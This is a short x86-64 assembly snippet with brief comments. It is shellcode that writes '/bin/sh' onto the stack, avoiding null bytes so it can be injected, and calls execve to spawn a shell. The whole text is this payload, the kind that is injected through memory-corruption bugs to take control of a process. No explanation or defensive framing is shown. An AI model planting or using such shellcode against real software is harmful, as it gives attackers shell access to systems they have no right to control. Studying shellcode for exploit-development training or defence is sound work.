# rax = sys_execve
xor rax, rax
mov al, 59
# write /bin/sh @rsp
mov rsi, 0x0168732f6e69622f
shl rsi, 8
shr rsi, 8
mov [rsp], rsi
# rdi = @/bin/sh
mov rdi, rsp
# nullify the other args
xor rsi, rsi
xor rdx, rdx
# trigger interrupt
syscall